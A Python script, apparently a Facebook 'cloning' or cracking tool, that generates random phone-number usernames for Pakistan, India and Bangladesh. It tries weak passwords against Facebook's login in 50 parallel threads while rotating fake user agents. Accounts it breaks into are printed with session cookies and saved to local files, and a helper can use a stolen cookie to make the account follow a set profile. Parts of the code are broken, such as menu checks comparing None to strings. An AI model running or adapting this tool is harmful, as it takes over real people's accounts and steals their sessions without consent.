import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

def o():
    os.system('clear')
    jalan(logo)
    print('\033[1;93m───────────────────────────────────────────────────────')
    jalan('\33[1;32m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM XD CRACK ')
    jalan('\33[1;34m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME FACEBOOK')
    jalan('\33[1;31m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW GROUP')
    jalan('\33[1;33m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW PAGE')
    jalan('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=ROOT.OF.JAHIED')
        return None
    if None == '3':
        os.system('xdg-open https://www.facebook.com/groups/367443570366706/?ref=share')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100076888617615')
        return None
    if None == '0':
        os.system('exit')
        return None


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSO SAD there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[BH-TEAM] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""
\033[93;1m  ____        _    _   _______ ______          __  __ 
\033[1;32m |  _ \      | |  | | |__   __|  ____|   /\   |  \/  |
\033[91;1m | |_) |_____| |__| |    | |  | |__     /  \  | \  / |
\033[95;1m |  _ <______|  __  |    | |  |  __|   / /\ \ | |\/| |
\033[94;1m | |_) |     | |  | |    | |  | |____ / ____ \| |  | |
\033[93;1m |____/      |_|  |_|    |_|  |______/_/    \_\_|  |_|

\33[1;32m───────────────────────────────────────────────────────
\033[1;95m[\033[1;93m[‌>]\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mZAHID HUSSAIN
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mZAHID HUSSAIN
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mBLACK-HUNTER-TEAM
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mRANDOM XD
\033[1;95m[\033[1;93m[>]\033[1;95m]\033[1;93m VERSION \033[1;91m : \033[1;91m1.0.9
\33[1;32m───────────────────────────────────────────────────────""")

loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo Internet Connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]

for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android 10; SM-M013F)'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    jalan('\33[1;32─────────────────────────────────────────────────────────')
    jalan('\033[1;32mPAK CODE   - \033[1;35m92301 \033[1;35m92302 \033[1;35m92303 \033[1;35m92305')
    jalan('\033[1;32mINDIA CODE - \033[1;34m91778 \033[1;34m91930 \033[1;34m91902 \033[1;34m91712')
    jalan('\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
    jalan('\33[1;32─────────────────────────────────────────────────────────\n')
    code = input('\033[1;35mCHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;95m[\033[1;93m[🎲]\033[1;95m]\033[1;93m TOTAL IDS: \033[1;91m'+tl)
        print('\033[1;95m[\033[1;93m[🎲]\033[1;95m]\033[1;93m THE PROCESS HAS BEEN STARTED')
        print('\033[1;95m[\033[1;93m[🎲]\033[1;95m]\033[1;91m WILL RUN ON ANY NETWORK')
        print('\33[1;32m───────────────────────────────────────────────────────')
        for love in user:
            pwx = [love, 'bangladesh']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print(' CRACK PROCESS HAS BEEN COMPLETED ')
    print('IDS SAVED IN BH-TEAM.txt, BH-TEAM.txt')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'www.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://www.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32mBHT-XD-OK ] '+cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;32mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/BHT-XD-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;34mBH-TEAM-CP ] '+cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BH-TEAM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[BHT-XD] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

o()
